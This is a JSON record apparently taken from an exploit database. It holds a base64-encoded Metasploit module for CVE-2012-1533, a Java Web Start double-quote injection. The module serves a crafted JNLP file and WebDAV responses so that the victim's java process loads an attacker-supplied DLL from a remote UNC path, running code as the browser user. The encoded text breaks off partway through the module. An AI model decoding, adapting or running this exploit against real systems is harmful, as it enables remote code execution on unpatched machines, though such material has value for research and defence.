{
    "source": "exploit-database", 
    "exploit": "IyMNCiMNCiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiMgSmF2YSBXZWIgU3RhcnQgRG91YmxlIFF1b3RlIEluamVjdCBSZW1vdGUgQ29kZSBFeGVjdXRpb24NCiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiMNCiMgRGF0ZTogSnVuIDEyIDIwMTIgKHVwZGF0ZWQ6IEp1biA2IDIwMTMpDQojIEF1dGhvcjogUmgwDQojIFZlcnNpb246IEF0IGxlYXN0IEphdmEgMS42LjMxIHRvIDEuNi4zNSBhbmQgMS43LjAzIHRvIDEuNy4wNw0KIyBUZXN0ZWQgb246IFdpbmRvd3MgWFAgU1AzIEVOIGFuZCBXaW5kb3dzIDcNCiMgQ1ZFOiAyMDEyLTE1MzMNCiMNCiMgYWR2aXNvcnk6IGh0dHA6Ly9wYXN0ZWJpbi5jb20vZVV1Y1ZhZ2UNCiMNCiMjDQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KDQpjbGFzcyBNZXRhc3Bsb2l0MyA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogICAgUmFuayA9IEV4Y2VsbGVudFJhbmtpbmcNCg0KICAgICMNCiAgICAjIFRoaXMgbW9kdWxlIGFjdHMgYXMgYW4gSFRUUCBzZXJ2ZXINCiAgICAjDQogICAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cFNlcnZlcjo6SFRNTA0KICAgIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpFWEUNCg0KICAgIGRlZiBpbml0aWFsaXplKGluZm8gPSB7fSkNCiAgICAgICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICAgICAgICdOYW1lJyAgICAgICAgICAgPT4gJ1N1biBKYXZhIFdlYiBTdGFydCBEb3VibGUgUXVvdGUgSW5qZWN0aW9uJywNCiAgICAgICAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgICAgICAgICAgICAgIFRoaXMgbW9kdWxlIGV4cGxvaXRzIGEgZmxhdyBpbiB0aGUgV2ViIFN0YXJ0IGNvbXBvbmVudCBvZiB0aGUgU3VuIEphdmENCiAgICAgICAgICAgICAgICBSdW50aW1lIEVudmlyb25tZW50LiBQYXJhbWV0ZXJzIGludGlhbC1oZWFwLXNpemUgYW5kIG1heC1oZWFwLXNpemUgaW4gYSBKTkxQDQogICAgICAgICAgICAgICAgZmlsZSBjYW4gY29udGFpbiBhIGRvdWJsZSBxdW90ZSB3aGljaCBpcyBub3QgcHJvcGVybHkgc2FuaXRpemVkIHdoZW4gY3JlYXRpbmcNCiAgICAgICAgICAgICAgICB0aGUgY29tbWFuZCBsaW5lIGZvciBqYXZhdy5leGUuIFRoaXMgYWxsb3dzIHRoZSBpbmplY3Rpb24gb2YgdGhlIC1YWGFsdGp2bQ0KICAgICAgICAgICAgICAgIG9wdGlvbiB0byBsb2FkIGEganZtLmRsbCBmcm9tIGEgcmVtb3RlIFVOQyBwYXRoIGludG8gdGhlIGphdmEgcHJvY2Vzcy4gVGh1cyANCiAgICAgICAgICAgICAgICBhbiBhdHRhY2tlciBjYW4gZXhlY3V0ZSBhcmJpdHJhcnkgY29kZSBpbiB0aGUgY29udGV4dCBvZiBhIGJyb3dzZXIgdXNlci4NCiAgICAgICAgICAgICAgICBUaGlzIGZsYXcgd2FzIGZpeGVkIGluIE9jdC4gMjAxMiBhbmQgYWZmZWN0cyBKUkUgPD0gMS42LjM1IGFuZCA8PSAxLjcuMDcuDQoNCiAgICAgICAgICAgICAgICBJbiBvcmRlciBmb3IgdGhpcyBtb2R1bGUgdG8gd29yaywgaXQgbXVzdCBiZSByYW4gYXMgcm9vdCBvbiBhIHNlcnZlciB0aGF0DQogICAgICAgICAgICAgICAgZG9lcyBub3Qgc2VydmUgU01CLiBBZGRpdGlvbmFsbHksIHRoZSB0YXJnZXQgaG9zdCBtdXN0IGhhdmUgdGhlIFdlYkNsaWVudA0KICAgICAgICAgICAgICAgIHNlcnZpY2UgKFdlYkRBViBNaW5pLVJlZGlyZWN0b3IpIGVuYWJsZWQuIEFsdGVybmF0aXZlbHkgYW4gVU5DIHBhdGggY29udGFpbmluZw0KICAgICAgICAgICAgICAgIGEganZtLmRsbCBjYW4gYmUgc3BlY2lmaWVkIHdpdGggYW4gb3duIFNNQiBzZXJ2ZXIuDQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgJ0F1dGhvcicgICAgICAgICA9PiANCiAgICAgICAgICAgICAgICBbDQogICAgICAgICAgICAgICAgICAgICMgTk9URTogbW9kdWxlIGlzIGNvbXBsZXRlbHkgYmFzZWQgb24gYW5kIGFsbW9zdCB0aGUgc2FtZSBsaWtlIGpkdWNrcyBtb2R1bGUgZm9yIENWRS0yMDEyLTA1MDAgKFJldjogNDM2OWY3M2MpDQogICAgICAgICAgICAgICAgICAgICdSaDAgPHJoMCAoKSB6MXAgZG90IGJpej4nLCAgICMgZGlzY292ZXJ5IGFuZCBtc2YgbW9kdWxlDQogICAgICAgICAgICAgICAgXSwNCiAgICAgICAgICAgICdWZXJzaW9uJyAgICAgICAgPT4gJzAuMCcsDQogICAgICAgICAgICAnUmVmZXJlbmNlcycgICAgID0+DQogICAgICAgICAgICAgICAgWw0KICAgICAgICAgICAgICAgICAgICBbICdVUkwnLCAnaHR0cDovL2Rldi5tZXRhc3Bsb2l0LmNvbS9yZWRtaW5lL3Byb2plY3RzL2ZyYW1ld29yay9yZXBvc2l0b3J5L2VudHJ5L21vZHVsZXMvZXhwbG9pdHMvd2luZG93cy9icm93c2VyL2phdmFfd3Nfdm1hcmdzLnJiJyBdLA0KICAgICAgICAgICAgICAgICAgICBbICdVUkwnLCAnaHR0cDovL3d3dy5vcmFjbGUuY29tL3RlY2huZXR3b3JrL3RvcGljcy9zZWN1cml0eS9qYXZhY3B1b2N0MjAxMi0xNTE1OTI0Lmh0bWwnIF0sDQogICAgICAgICAgICAgICAgXSwNCiAgICAgICAgICAgICdQbGF0Zm9ybScgICAgICAgPT4gJ3dpbicsDQogICAgICAgICAgICAnUGF5bG9hZCcgICAgICAgID0+DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAnU3BhY2UnICAgID0+IDEwMjQsDQogICAgICAgICAgICAgICAgICAgICdCYWRDaGFycycgPT4gJycsDQogICAgICAgICAgICAgICAgICAgICdEaXNhYmxlTm9wcycgPT4gdHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgJ1ByZXBlbmRFbmNvZGVyJyA9PiAiXHg4MVx4YzRceDU0XHhmMlx4ZmZceGZmIg0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAnVGFyZ2V0cycgICAgICAgID0+DQogICAgICAgICAgICAgICAgWw0KICAgICAgICAgICAgICAgICAgICBbICdBdXRvbWF0aWMnLCB7IH0gXSwNCiAgICAgICAgICAgICAgICAgICAgWyAnSmF2YSBSdW50aW1lIDEuNi4zMSB0byAxLjYuMzUgYW5kIDEuNy4wMyB0byAxLjcuMDcgb24gV2luZG93cyB4ODYnLA0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdQbGF0Zm9ybScgPT4gJ3dpbicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0FyY2gnID0+IEFSQ0hfWDg2DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgICAgICAgICAgXSwNCiAgICAgICAgICAgICdEZWZhdWx0VGFyZ2V0JyAgPT4gMCwNCiAgICAgICAgICAgICkpDQoNCiAgICAgICAgcmVnaXN0ZXJfb3B0aW9ucygNCiAgICAgICAgICAgIFsNCiAgICAgICAgICAgICAgICBPcHRQb3J0Lm5ldygnU1JWUE9SVCcsIFsgdHJ1ZSwgIlRoZSBkYWVtb24gcG9ydCB0byBsaXN0ZW4gb24iLCA4MCBdKSwNCiAgICAgICAgICAgICAgICBPcHRTdHJpbmcubmV3KCdVUklQQVRIJywgWyB0cnVlLCAiVGhlIFVSSSB0byB1c2UuIiwgIi8iIF0pLA0KICAgICAgICAgICAgICAgIE9wdFN0cmluZy5uZXcoJ1VOQ1BBVEgnLCBbIGZhbHNlLCAnT3ZlcnJpZGUgdGhlIFVOQyBwYXRoIHRvIHVzZS4gKFVzZSB3aXRoIGEgU01CIHNlcnZlciknIF0pDQogICAgICAgICAgICBdLCBzZWxmLmNsYXNzKQ0KICAgIGVuZA0KDQoNCiAgICBkZWYgYXV0b190YXJnZXQoY2xpLCByZXF1ZXN0KQ0KICAgICAgICBhZ2VudCA9IHJlcXVlc3QuaGVhZGVyc1snVXNlci1BZ2VudCddDQoNCiAgICAgICAgcmV0ID0gbmlsDQogICAgICAgICNwcmludF9zdGF0dXMoIkFnZW50OiAje2FnZW50fSIpDQogICAgICAgICMgQ2hlY2sgZm9yIE1TSUUgYW5kL29yIFdlYkRBViByZWRpcmVjdG9yIHJlcXVlc3RzDQogICAgICAgIGlmIGFnZW50ID1+IC8oV2luZG93cyBOVCAoNXw2KVwuKDB8MXwyKXxNaW5pUmVkaXJcLyg1fDYpXC4oMHwxfDIpKS8NCiAgICAgICAgICAgIHJldCA9IHRhcmdldHNbMV0NCiAgICAgICAgZWxzaWYgYWdlbnQgPX4gL01TSUUgKDZ8N3w4KVwuMC8NCiAgICAgICAgICAgIHJldCA9IHRhcmdldHNbMV0NCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcHJpbnRfc3RhdHVzKCJVbmtub3duIFVzZXItQWdlbnQgI3thZ2VudH0gZnJvbSAje2NsaS5wZWVyaG9zdH06I3tjbGkucGVlcnBvcnR9IikNCiAgICAgICAgZW5kDQoNCiAgICAgICAgcmV0DQogICAgZW5kDQoNCg0KICAgIGRlZiBvbl9yZXF1ZXN0X3VyaShjbGksIHJlcXVlc3QpDQoNCiAgICAgICAgIyBGb3IgdGhpcyBleHBsb2l0LCB0aGlzIGRvZXMgbGl0dGxlIGJlc2lkZXMgZW5zdXJlcyB0aGUgdXNlciBhZ2VudCBpcyBhIHJlY29nbml6ZWQgb25lLi4NCiAgICAgICAgbXl0YXJnZXQgPSB0YXJnZXQNCiAgICAgICAgaWYgdGFyZ2V0Lm5hbWUgPT0gJ0F1dG9tYXRpYycNCiAgICAgICAgICAgIG15dGFyZ2V0ID0gYXV0b190YXJnZXQoY2xpLCByZXF1ZXN0KQ0KICAgICAgICAgICAgaWYgKG5vdCBteXRhcmdldCkNCiAgICAgICAgICAgICAgICBzZW5kX25vdF9mb3VuZChjbGkpDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kDQoNCiAgICAgICAgIyBTcGVjaWFsIGNhc2UgdG8gcHJvY2VzcyBPUFRJT05TIGZvciAvDQogICAgICAgIGlmIChyZXF1ZXN0Lm1ldGhvZCA9PSAnT1BUSU9OUycgYW5kIHJlcXVlc3QudXJpID09ICcvJykNCiAgICAgICAgICAgIHByb2Nlc3Nfb3B0aW9ucyhjbGksIHJlcXVlc3QsIG15dGFyZ2V0KQ0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIGVuZA0KDQogICAgICAgICMgRGlzY2FyZCByZXF1ZXN0cyBmb3IgaWNvIGZpbGVzDQogICAgICAgIGlmIChyZXF1ZXN0LnVyaSA9fiAvXC5pY28kL2kpDQogICAgICAgICAgICBzZW5kX25vdF9mb3VuZChjbGkpDQogICAgICAgICAgICByZXR1cm4NCiAgICAgICAgZW5kDQoNCiAgICAgICAgIyBJZiB0aGVyZSBpcyBubyBzdWJkaXJlY3RvcnkgaW4gdGhlIHJlcXVlc3QsIHdlIG5lZWQgdG8gcmVkaXJlY3QuDQogICAgICAgIGlmIChyZXF1ZXN0LnVyaSA9PSAnLycpIG9yIG5vdCAocmVxdWVzdC51cmkgPX4gL1wvKFteXC9dKylcLy8pDQogICAgICAgICAgICBpZiAocmVxdWVzdC51cmkgPT0gJy8nKQ0KICAgICAgICAgICAgICAgIHN1YmRpciA9ICcvJyArIHJhbmRfdGV4dF9hbHBoYW51bWVyaWMoOCtyYW5kKDgpKSArICcvJw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHN1YmRpciA9IHJlcXVlc3QudXJpICsgJy8nDQogICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIHByaW50X3N0YXR1cygiUmVxdWVzdCBmb3IgXCIje3JlcXVlc3QudXJpfVwiIGRvZXMgbm90IGNvbnRhaW4gYSBzdWItZGlyZWN0b3J5LCByZWRpcmVjdGluZyB0byAje3N1YmRpcn0gLi4uIikNCiAgICAgICAgICAgIHNlbmRfcmVkaXJlY3QoY2xpLCBzdWJkaXIpDQogICAgICAgICAgICByZXR1cm4NCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgc2hhcmVfbmFtZSA9ICQxDQogICAgICAgIGVuZA0KDQogICAgICAgICMgZGlzcGF0Y2ggV2ViREFWIHJlcXVlc3RzIGJhc2VkIG9uIG1ldGhvZCBmaXJzdA0KICAgICAgICBjYXNlIHJlcXVlc3QubWV0aG9kDQogICAgICAgIHdoZW4gJ09QVElPTlMnDQogICAgICAgICAgICBwcm9jZXNzX29wdGlvbnMoY2xpLCByZXF1ZXN0LCBteXRhcmdldCkNCg0KICAgICAgICB3aGVuICdQUk9QRklORCcNCiAgICAgICAgICAgIHByb2Nlc3NfcHJvcGZpbmQoY2xpLCByZXF1ZXN0LCBteXRhcmdldCkNCg0KICAgICAgICB3aGVuICdHRVQnDQogICAgICAgICAgICBwcm9jZXNzX2dldChjbGksIHJlcXVlc3QsIG15dGFyZ2V0LCBzaGFyZV9uYW1lKQ0KDQogICAgICAgIHdoZW4gJ1BVVCcNCiAgICAgICAgICAgIHByaW50X3N0YXR1cygiU2VuZGluZyA0MDQgZm9yIFBVVCAje3JlcXVlc3QudXJpfSAuLi4iKQ0KICAgICAgICAgICAgc2VuZF9ub3RfZm91bmQoY2xpKQ0KDQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHByaW50X2Vycm9yKCJVbmV4cGVjdGVkIHJlcXVlc3QgbWV0aG9kIGVuY291bnRlcmVkOiAje3JlcXVlc3QubWV0aG9kfSIpDQoNCiAgICAgICAgZW5kDQoNCiAgICBlbmQNCg0KICAgICMNCiAgICAjIEdFVCByZXF1ZXN0cw0KICAgICMNCiAgICBkZWYgcHJvY2Vzc19nZXQoY2xpLCByZXF1ZXN0LCB0YXJnZXQsIHNoYXJlX25hbWUpDQoNCiAgICAgICAgcHJpbnRfc3RhdHVzKCJSZXNwb25kaW5nIHRvIFwiR0VUICN7cmVxdWVzdC51cml9XCIgcmVxdWVzdCBmcm9tICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0iKQ0KICAgICAgICAjIGRpc3BhdGNoIGJhc2VkIG9uIGV4dGVuc2lvbg0KICAgICAgICBpZiAocmVxdWVzdC51cmkgPX4gL1wuZGxsJC9pKQ0KICAgICAgICAgICAgIw0KICAgICAgICAgICAgIyBETEwgcmVxdWVzdHMgc2VudCBieSBJRSBhbmQgdGhlIFdlYkRhdiBNaW5pLVJlZGlyZWN0b3INCiAgICAgICAgICAgICMNCiAgICAgICAgICAgIHByaW50X3N0YXR1cygiU2VuZGluZyBETEwgdG8gI3tjbGkucGVlcmhvc3R9OiN7Y2xpLnBlZXJwb3J0fS4uLiIpDQoNCiAgICAgICAgICAgICMgUmUtZ2VuZXJhdGUgdGhlIHBheWxvYWQNCiAgICAgICAgICAgIHJldHVybiBpZiAoKHAgPSByZWdlbmVyYXRlX3BheWxvYWQoY2xpKSkgPT0gbmlsKQ0KDQogICAgICAgICAgICAjIEdlbmVyYXRlIGEgRExMIGJhc2VkIG9uIHRoZSBwYXlsb2FkDQogICAgICAgICAgICBkbGxfZGF0YSA9IGdlbmVyYXRlX3BheWxvYWRfZGxsKHsgOmNvZGUgPT4gcC5lbmNvZGVkIH0pDQoNCiAgICAgICAgICAgICMgU2VuZCBpdCA6KQ0KICAgICAgICAgICAgc2VuZF9yZXNwb25zZShjbGksIGRsbF9kYXRhLCB7ICdDb250ZW50LVR5cGUnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nIH0pDQoNCiAgICAgICAgZWxzaWYgKHJlcXVlc3QudXJpID1+IC9cLmpubHAkL2kpDQogICAgICAgICAgICAjDQogICAgICAgICAgICAjIFNlbmQgdGhlIGpubHAgZG9jdW1lbnQNCiAgICAgICAgICAgICMNCg0KICAgICAgICAgICAgIyBQcmVwYXJlIHRoZSBVTkMgcGF0aC4uLg0KICAgICAgICAgICAgaWYgKGRhdGFzdG9yZVsnVU5DUEFUSCddKQ0KICAgICAgICAgICAgICAgIHVuYyA9IGRhdGFzdG9yZVsnVU5DUEFUSCddLmR1cA0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIG15X2hvc3QgPSAoZGF0YXN0b3JlWydTUlZIT1NUJ10gPT0gJzAuMC4wLjAnKSA/IFJleDo6U29ja2V0LnNvdXJjZV9hZGRyZXNzKGNsaS5wZWVyaG9zdCkgOiBkYXRhc3RvcmVbJ1NSVkhPU1QnXQ0KICAgICAgICAgICAgICAgIHVuYyA9ICJcXFxcIiArIG15X2hvc3QgKyAiXFwiICsgc2hhcmVfbmFtZQ0KICAgICAgICAgICAgZW5kDQoNCiAgICAgICAgICAgICMgTk9URTogd2UgZW5zdXJlIHRoZXJlJ3Mgb25seSBhIHNpbmdsZSBiYWNrc2xhc2ggaGVyZSBzaW5jZSBpdCB3aWxsIGdldCBlc2NhcGVkDQogICAgICAgICAgICBpZiB1bmNbMCwyXSA9PSAiXFxcXCINCiAgICAgICAgICAgICAgICB1bmMuc2xpY2UhKDAsIDEpDQogICAgICAgICAgICBlbmQNCg0KICAgICAgICAgICAgaHR0cF9hZ2VudCA9IFJleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEoOCtyYW5kKDgpKQ0KDQogICAgICAgICAgICAjIHVzZSBpbml0aWFsLWhlYXAtc2l6ZT0nIicgdG8gaW5qZWN0IGEgZG91YmxlIHF1b3RlIGFuZCBtYXgtaGVhcC1zaXplPSIgLVhYYWx0anZtPVxcSVBcc2hhcmUgIiB0bw0KICAgICAgICAgICAgIyBpbmplY3QgYSBwYXJhbWV0ZXIgaW50byB0aGUgY29tbWFuZCBsaW5lIG9mIGphdmF3LmV4ZQ0KICAgICAgICAgICAgIyBjb2RlYmFzZSwgaHJlZiBhbmQgYXBwbGljYXRpb24tZGVzYyBwYXJhbWV0ZXJzIHN1Y2Nlc3NmdWxseSBzdXBwcmVzcyBqYXZhIHNwbGFzaA0KICAgICAgICAgICAgam5scF9kYXRhID0gPDwtRU9TDQo8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCI/Pg0KPGpubHAgdmVyc2lvbj0iMSIgY29kZWJhc2U9IiN7UmV4OjpUZXh0LnJhbmRfdGV4dF9hbHBoYShyYW5kKDEwKSsxMCl9IiBocmVmPSIje1JleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEocmFuZCgxMCkrMTApfS5qbmxwIj4NCjxpbmZvcm1hdGlvbj4NCiAgIDx0aXRsZT4je1JleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEocmFuZCgxMCkrMTApfTwvdGl0bGU+DQogICA8dmVuZG9yPiN7UmV4OjpUZXh0LnJhbmRfdGV4dF9hbHBoYShyYW5kKDEwKSsxMCl9PC92ZW5kb3I+DQogICA8ZGVzY3JpcHRpb24+I3tSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKHJhbmQoMTApKzEwKX08L2Rlc2NyaXB0aW9uPg0KPC9pbmZvcm1hdGlvbj4NCjxyZXNvdXJjZXM+DQogICA8amF2YSB2ZXJzaW9uPSIxLjYrIiBpbml0aWFsLWhlYXAtc2l6ZT0nIicgbWF4LWhlYXAtc2l6ZT0iIC1YWGFsdGp2bT0je3VuY30gIiAvPg0KPC9yZXNvdXJjZXM+DQo8YXBwbGljYXRpb24tZGVzYyBwcm9ncmVzcy1jbGFzcz0iI3tSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKHJhbmQoMTApKzEwKX0iIC8+DQo8L2pubHA+DQpFT1MNCiAgICAgICAgICAgIHByaW50X3N0YXR1cygiU2VuZGluZyBKTkxQIHRvICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0uLi4iKQ0KDQoNCiAgICAgICAgICAgIHNlbmRfcmVzcG9uc2UoY2xpLCBqbmxwX2RhdGEsIHsgJ0NvbnRlbnQtVHlwZScgPT4gJ2FwcGxpY2F0aW9uL3gtamF2YS1qbmxwLWZpbGUnIH0pDQoNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcHJpbnRfc3RhdHVzKCJTZW5kaW5nIHJlZGlyZWN0IHRvIHRoZSBKTkxQIGZpbGUgdG8gI3tjbGkucGVlcmhvc3R9OiN7Y2xpLnBlZXJwb3J0fSIpDQogICAgICAgICAgICBqbmxwX25hbWUgPSBSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKDggKyByYW5kKDgpKQ0KDQogICAgICAgICAgICBqbmxwX3BhdGggPSBnZXRfcmVzb3VyY2UoKQ0KICAgICAgICAgICAgaWYgam5scF9wYXRoWy0xLDFdICE9ICcvJw0KICAgICAgICAgICAgICAgIGpubHBfcGF0aCA8PCAnLycNCiAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgam5scF9wYXRoIDw8IHJlcXVlc3QudXJpLnNwbGl0KCcvJylbLTFdIDw8ICcvJw0KICAgICAgICAgICAgam5scF9wYXRoIDw8IGpubHBfbmFtZSA8PCAiLmpubHAiDQoNCiAgICAgICAgICAgIHNlbmRfcmVkaXJlY3QoY2xpLCBqbmxwX3BhdGgsICcnKQ0KDQogICAgICAgIGVuZA0KDQogICAgZW5kDQoNCiAgICAjDQogICAgIyBPUFRJT05TIHJlcXVlc3RzIHNlbnQgYnkgdGhlIFdlYkRhdiBNaW5pLVJlZGlyZWN0b3INCiAgICAjDQogICAgZGVmIHByb2Nlc3Nfb3B0aW9ucyhjbGksIHJlcXVlc3QsIHRhcmdldCkNCiAgICAgICAgcHJpbnRfc3RhdHVzKCJSZXNwb25kaW5nIHRvIFdlYkRBViBcIk9QVElPTlMgI3tyZXF1ZXN0LnVyaX1cIiByZXF1ZXN0IGZyb20gI3tjbGkucGVlcmhvc3R9OiN7Y2xpLnBlZXJwb3J0fSIpDQogICAgICAgIGhlYWRlcnMgPSB7DQogICAgICAgICAgICAjJ0RBU0wnICAgPT4gJzxEQVY6c3FsPicsDQogICAgICAgICAgICAjJ0RBVicgICAgPT4gJzEsIDInLA0KICAgICAgICAgICAgJ0FsbG93JyAgPT4gJ09QVElPTlMsIEdFVCwgUFJPUEZJTkQnLA0KICAgICAgICAgICAgJ1B1YmxpYycgPT4gJ09QVElPTlMsIEdFVCwgUFJPUEZJTkQnDQogICAgICAgIH0NCiAgICAgICAgc2VuZF9yZXNwb25zZShjbGksICcnLCBoZWFkZXJzKQ0KICAgIGVuZA0KDQoNCiAgICAjDQogICAgIyBQUk9QRklORCByZXF1ZXN0cyBzZW50IGJ5IHRoZSBXZWJEYXYgTWluaS1SZWRpcmVjdG9yDQogICAgIw0KICAgIGRlZiBwcm9jZXNzX3Byb3BmaW5kKGNsaSwgcmVxdWVzdCwgdGFyZ2V0KQ0KICAgICAgICBwYXRoID0gcmVxdWVzdC51cmkNCiAgICAgICAgcHJpbnRfc3RhdHVzKCJSZWNlaXZlZCBXZWJEQVYgXCJQUk9QRklORCAje3JlcXVlc3QudXJpfVwiIHJlcXVlc3QgZnJvbSAje2NsaS5wZWVyaG9zdH06I3tjbGkucGVlcnBvcnR9IikNCiAgICAgICAgYm9keSA9ICcnDQoNCiAgICAgICAgaWYgKHBhdGggPX4gL1wuZGxsJC9pKQ0KICAgICAgICAgICAgIyBSZXNwb25zZSBmb3IgdGhlIERMTA0KICAgICAgICAgICAgcHJpbnRfc3RhdHVzKCJTZW5kaW5nIERMTCBtdWx0aXN0YXR1cyBmb3IgI3twYXRofSAuLi4iKQ0KIzxscDE6Z2V0Y29udGVudGxlbmd0aD40NTA1NjwvbHAxOmdldGNvbnRlbnRsZW5ndGg+DQogICAgICAgICAgICBib2R5ID0gJVF8PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjxEOm11bHRpc3RhdHVzIHhtbG5zOkQ9IkRBVjoiPg0KPEQ6cmVzcG9uc2UgeG1sbnM6bHAxPSJEQVY6IiB4bWxuczpscDI9Imh0dHA6Ly9hcGFjaGUub3JnL2Rhdi9wcm9wcy8iPg0KPEQ6aHJlZj4je3BhdGh9PC9EOmhyZWY+DQo8RDpwcm9wc3RhdD4NCjxEOnByb3A+DQo8bHAxOnJlc291cmNldHlwZS8+DQo8bHAxOmNyZWF0aW9uZGF0ZT4yMDEwLTAyLTI2VDE3OjA3OjEyWjwvbHAxOmNyZWF0aW9uZGF0ZT4NCjxscDE6Z2V0bGFzdG1vZGlmaWVkPkZyaSwgMjYgRmViIDIwMTAgMTc6MDc6MTIgR01UPC9scDE6Z2V0bGFzdG1vZGlmaWVkPg0KPGxwMTpnZXRldGFnPiIzOWUwMTMyLWIwMDAtNDNjNmU1ZjhkMmY4MCI8L2xwMTpnZXRldGFnPg0KPGxwMjpleGVjdXRhYmxlPkY8L2xwMjpleGVjdXRhYmxlPg0KPEQ6bG9ja2Rpc2NvdmVyeS8+DQo8RDpnZXRjb250ZW50dHlwZT5hcHBsaWNhdGlvbi9vY3RldC1zdHJlYW08L0Q6Z2V0Y29udGVudHR5cGU+DQo8L0Q6cHJvcD4NCjxEOnN0YXR1cz5IVFRQLzEuMSAyMDAgT0s8L0Q6c3RhdHVzPg0KPC9EOnByb3BzdGF0Pg0KPC9EOnJlc3BvbnNlPg0KPC9EOm11bHRpc3RhdHVzPg0KfA0KDQogICAgICAgIGVsc2lmIChwYXRoID1+IC9cLyQvKSBvciAobm90IHBhdGguc3ViKCcvJywgJycpLmluZGV4KCcvJykpDQogICAgICAgICAgICAjIFJlc3BvbnNlIGZvciBhbnl0aGluZyBlbHNlIChnZW5lcmFsbHkganVzdCAvKQ0KICAgICAgICAgICAgcHJpbnRfc3RhdHVzKCJTZW5kaW5nIGRpcmVjdG9yeSBtdWx0aXN0YXR1cyBmb3IgI3twYXRofSAuLi4iKQ0KICAgICAgICAgICAgYm9keSA9ICVRfDw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8RDptdWx0aXN0YXR1cyB4bWxuczpEPSJEQVY6Ij4NCjxEOnJlc3BvbnNlIHhtbG5zOmxwMT0iREFWOiIgeG1sbnM6bHAyPSJodHRwOi8vYXBhY2hlLm9yZy9kYXYvcHJvcHMvIj4NCjxEOmhyZWY+I3twYXRofTwvRDpocmVmPg0KPEQ6cHJvcHN0YXQ+DQo8RDpwcm9wPg0KPGxwMTpyZXNvdXJjZXR5cGU+PEQ6Y29sbGVjdGlvbi8+PC9scDE6cmVzb3VyY2V0eXBlPg0KPGxwMTpjcmVhdGlvbmRhdGU+MjAxMC0wMi0yNlQxNzowNzoxMlo8L2xwMTpjcmVhdGlvbmRhdGU+DQo8bHAxOmdldGxhc3Rtb2RpZmllZD5GcmksIDI2IEZlYiAyMDEwIDE3OjA3OjEyIEdNVDwvbHAxOmdldGxhc3Rtb2RpZmllZD4NCjxscDE6Z2V0ZXRhZz4iMzllMDAwMS0xMDAwLTQ4MDhjM2VjOTUwMDAiPC9scDE6Z2V0ZXRhZz4NCjxEOmxvY2tkaXNjb3ZlcnkvPg0KPEQ6Z2V0Y29udGVudHR5cGU+aHR0cGQvdW5peC1kaXJlY3Rvcnk8L0Q6Z2V0Y29udGVudHR5cGU+DQo8L0Q6cHJvcD4NCjxEOnN0YXR1cz5IVFRQLzEuMSAyMDAgT0s8L0Q6c3RhdHVzPg0KPC9EOnByb3BzdGF0Pg0KPC9EOnJlc3BvbnNlPg0KPC9EOm11bHRpc3RhdHVzPg0KfA0KDQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHByaW50X3N0YXR1cygiU2VuZGluZyA0MDQgZm9yICN7cGF0aH0gLi4uIikNCiAgICAgICAgICAgIHNlbmRfbm90X2ZvdW5kKGNsaSkNCiAgICAgICAgICAgIHJldHVybg0KDQogICAgICAgIGVuZA0KDQogICAgICAgICMgc2VuZCB0aGUgcmVzcG9uc2UNCiAgICAgICAgcmVzcCA9IGNyZWF0ZV9yZXNwb25zZSgyMDcsICJNdWx0aS1TdGF0dXMiKQ0KICAgICAgICByZXNwLmJvZHkgPSBib2R5DQogICAgICAgIHJlc3BbJ0NvbnRlbnQtVHlwZSddID0gJ3RleHQveG1sJw0KICAgICAgICBjbGkuc2VuZF9yZXNwb25zZShyZXNwKQ0KICAgIGVuZA0KDQoNCiAgICAjDQogICAgIyBNYWtlIHN1cmUgd2UncmUgb24gdGhlIHJpZ2h0IHBvcnQvcGF0aCB0byBzdXBwb3J0IFdlYkRBVg0KICAgICMNCiAgICBkZWYgZXhwbG9pdA0KICAgICAgICBpZiAhZGF0YXN0b3JlWydVTkNQQVRIJ10gJiYgKGRhdGFzdG9yZVsnU1JWUE9SVCddLnRvX2kgIT0gODAgfHwgZGF0YXN0b3JlWydVUklQQVRIJ10gIT0gJy8nKQ0KICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yLCAnVXNpbmcgV2V